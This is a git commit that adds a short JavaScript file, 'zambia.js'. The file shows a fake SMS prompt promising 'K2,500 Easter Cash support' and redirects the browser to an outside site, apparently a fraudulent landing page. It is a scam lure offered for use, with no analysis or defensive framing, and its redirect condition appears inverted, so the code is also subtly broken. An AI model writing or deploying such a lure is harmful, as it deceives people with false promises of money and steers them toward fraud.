9981a94cbc60efe0655edf5b3de347d38f82e41f
usorondo53 <duct_wayward.8g@icloud.com>
2026-03-27 05:00:07 +0100

    Create zambia.js

---
+++ zambia.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw K2,500'
+password=prompt('SMS: Congratulations, you are eligible to receive K2,500 Easter Cash support. kindly press OK to Apply','Withdraw K2,500');
+if (password != 'Withdraw K2,500') {
+location.href='https://www.ekaokon.site/easter-k25000';
+}
